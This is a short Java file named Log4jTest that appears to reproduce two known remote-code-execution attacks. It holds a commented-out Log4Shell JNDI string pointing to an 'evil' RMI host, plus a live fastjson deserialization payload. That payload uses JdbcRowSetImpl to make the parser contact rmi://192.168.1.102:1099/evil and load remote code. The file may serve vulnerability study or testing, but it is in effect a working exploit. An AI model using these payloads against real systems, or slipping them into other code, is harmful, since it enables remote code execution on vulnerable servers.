package com.example.demo.java.log4j;

import com.alibaba.fastjson.JSONObject;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {
    private final static Logger log = LogManager.getLogger();

    public static void main(String[] args) {
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

//        String username = "${jndi:rmi://192.168.1.102:1099/evil}";
//        log.info("${java:os}");

        String payload="{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"\n" +
                "b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://192.168.1.102:1099/evil\",\"autoCommit\":true}}\n";
        JSONObject.parseObject(payload);
    }
}
